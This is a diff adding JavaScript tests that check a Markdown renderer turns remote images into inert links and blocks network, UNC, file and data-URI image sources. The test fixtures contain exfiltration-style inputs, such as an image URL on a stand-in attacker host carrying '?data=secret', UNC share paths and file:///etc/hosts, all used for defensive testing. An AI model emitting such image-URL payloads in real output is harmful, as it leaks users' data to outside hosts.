@@ -31,3 +31,21 @@ test('local Markdown image references use the scoped media endpoint', () => {
     '![asset](character_files/example.png)'}));
   assert.match(html, /\/api\/media\?path=character_files%2Fexample.png/);
 });
+
+test('remote Markdown images become click-to-open links and never load', () => {
+  const html = renderToStaticMarkup(React.createElement(FormattedText, {text:
+    '![chart](https://attacker.example/leak.png?data=secret) and ![](http://h.example/x.png)'}));
+  assert.doesNotMatch(html, /<img/);
+  assert.match(html, /<a class="image-link" href="https:\/\/attacker.example\/leak.png\?data=secret" target="_blank" rel="noreferrer"[^>]*>chart \(attacker.example\)<\/a>/);
+  assert.match(html, />Image \(h.example\)<\/a>/);
+});
+
+test('network paths and other schemes in an image render neither an <img> nor a media request', () => {
+  // Markdown \\ is one backslash, so the second source is \\attacker\share\x.png; react-markdown passes it as %5C%5C...
+  for (const text of ['![x](//attacker/share/x.png)', '![x](\\\\\\\\attacker\\\\share\\\\x.png)', '![x](<\\\\\\\\attacker\\\\share>)',
+    '![x](%5C%5Cattacker/x.png)', '![x](file:///etc/hosts)', '![x](data:image/png;base64,AAAA)']) {
+    const html = renderToStaticMarkup(React.createElement(FormattedText, {text}));
+    assert.doesNotMatch(html, /<img|\/api\/media|attacker|href=/, text);
+    assert.match(html, /class="image-alt">x</, text);
+  }
+});
